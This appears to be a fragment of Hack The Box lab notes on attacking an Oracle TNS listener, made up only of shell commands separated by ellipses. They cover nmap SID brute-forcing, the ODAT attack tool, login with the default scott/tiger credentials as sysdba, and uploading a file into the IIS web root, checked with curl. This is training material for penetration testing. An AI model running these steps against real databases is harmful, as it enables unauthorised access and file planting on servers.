...
```shell-session
NivaLada@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open
...
```shell-session
NivaLada@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
...
```shell-session
NivaLada@htb[/htb]$ ./odat.py all -s 10.129.204.235
...
```shell-session
NivaLada@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE
...
```shell-session
NivaLada@htb[/htb]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```
...
```shell-session
NivaLada@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba
...
```shell-session
NivaLada@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
NivaLada@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
...
```shell-session
NivaLada@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt
